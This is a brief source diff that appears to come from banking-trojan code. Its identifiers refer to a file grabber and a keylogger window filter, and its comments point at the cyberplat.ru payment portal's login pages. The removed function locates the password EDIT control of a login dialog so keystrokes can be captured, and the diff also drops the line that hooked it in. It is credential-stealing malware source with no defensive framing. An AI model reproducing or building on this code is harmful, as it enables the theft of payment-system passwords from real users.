@@ -63,15 +63,6 @@ static void Deactivate( LPVOID Sender )
 	FileGrabber::Release();
 }
 
-void OnGetLogWnd(LPVOID Sender, HWND &LogWnd)
-{
-	TKlgWndFilter* filter = (TKlgWndFilter*)Sender;
-	//ищет контрол ввода пароля
-	HWND parent = (HWND)pGetParent(filter->DialogWnd);
-	LogWnd = (HWND)pFindWindowExA( parent, 0, "EDIT", 0 );
-	if( LogWnd == 0 ) LogWnd = parent;
-}
-
 	//http://www.cyberplat.ru/tech/online/
 	//https://portal.cyberplat.ru/cgi-bin/login.cgi
 
@@ -92,7 +83,6 @@ static void Init()
 			if( F2 )
 			{
                 F2->MouseLogWnd = MOUSE_LOG_WND_FILTER;
-				//F2->OnGetLogWnd = OnGetLogWnd;
 				F2->PreFilter = F1;
 			}
 		}
